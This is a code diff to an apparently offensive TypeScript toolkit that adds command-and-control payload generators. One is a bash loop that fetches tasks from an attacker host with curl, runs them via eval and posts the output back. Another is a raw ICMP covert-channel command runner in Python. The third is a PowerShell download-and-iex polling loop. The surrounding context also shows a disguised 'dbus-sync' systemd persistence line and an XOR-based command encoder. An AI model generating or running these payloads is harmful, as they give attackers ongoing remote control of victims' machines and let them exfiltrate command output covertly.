@@ -222,6 +222,48 @@ systemctl --user enable dbus-sync 2>/dev/null; systemctl --user start dbus-sync 
   ];
 }
 
+export interface C2PollerBundle {
+  id:      string;
+  name:    string;
+  kind:    string;
+  command: string;
+  notes:   string;
+}
+
+function oobHost(cbUrl: string): string {
+  try { return new URL(cbUrl).hostname; } catch { return "c2.nexusforge.local"; }
+}
+
+function buildHttpPollerC2(lhost: string, lport: string, cbUrl: string): C2PollerBundle {
+  const host = oobHost(cbUrl);
+  const sh = `while true; do
+_CMD=$(curl -sk "http://${lhost}:${lport}/task?h=${host}" 2>/dev/null)
+[ -n "$_CMD" ] && eval "$_CMD" 2>&1 | curl -sk -X POST "http://${lhost}:${lport}/result" --data-binary @- >/dev/null
+sleep 30
+done &`;
+  return { id:"http_poller_c2", name:"HTTP Polling C2", kind:"polling", command:sh, notes:"Simple HTTP C2 over port 80/443. Polls /task endpoint and posts results to /result." };
+}
+
+function buildIcmpC2(_lhost: string, _lport: string): C2PollerBundle {
+  const sh = `python3 -c "
+import os,struct,socket,time
+while True:
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+        data=s.recv(1024)[28:]
+        if data.startswith(b'NX:'):
+            out=os.popen(data[3:].decode(errors='replace')).read()
+            time.sleep(1)
+    except: time.sleep(10)
+" 2>/dev/null &`;
+  return { id:"icmp_c2", name:"ICMP Tunnel C2", kind:"tunnel", command:sh, notes:"ICMP-based covert channel. Commands embedded in ICMP echo payload prefixed with NX:." };
+}
+
+function buildWindowsPowerShellC2(lhost: string, lport: string, _cbUrl: string): C2PollerBundle {
+  const ps = `while($true){try{$c=[System.Net.WebClient]::new();$t=$c.DownloadString("http://${lhost}:${lport}/task");if($t){$r=iex $t 2>&1|Out-String;$c.UploadString("http://${lhost}:${lport}/result",$r)}}catch{}Start-Sleep 30}`;
+  return { id:"win_ps_c2", name:"Windows PowerShell HTTP C2", kind:"polling", command:ps, notes:"Windows PowerShell C2 polling loop. Executes commands from /task endpoint." };
+}
+
 export function buildGistCommandEncoder(cmd: string, xorKey: number): string {
   const encoded = Buffer.from(cmd).map(b => b ^ xorKey);
   return Buffer.from(encoded).toString("base64");
